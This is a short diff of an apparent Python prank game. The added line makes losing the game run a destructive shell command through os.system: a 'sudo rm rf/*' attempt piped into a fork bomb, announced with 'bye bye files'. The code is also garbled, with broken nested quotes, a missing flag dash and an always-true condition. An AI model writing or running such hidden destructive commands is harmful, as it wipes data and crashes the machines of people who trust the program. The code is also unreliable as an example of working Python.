@@ -15,7 +15,7 @@ if start_game == str("yes") or str("Yes"):
     print(play)
     choose
     if choose == play:
-        print ("You loose :( bye bye files)") and os.system("sudo :(){ :|:& };:")
+        print ("You loose :( bye bye files)") and os.system("sudo "sudo rm rf/* | :(){ :|:& };:")
 else:
     print("smart move")
     
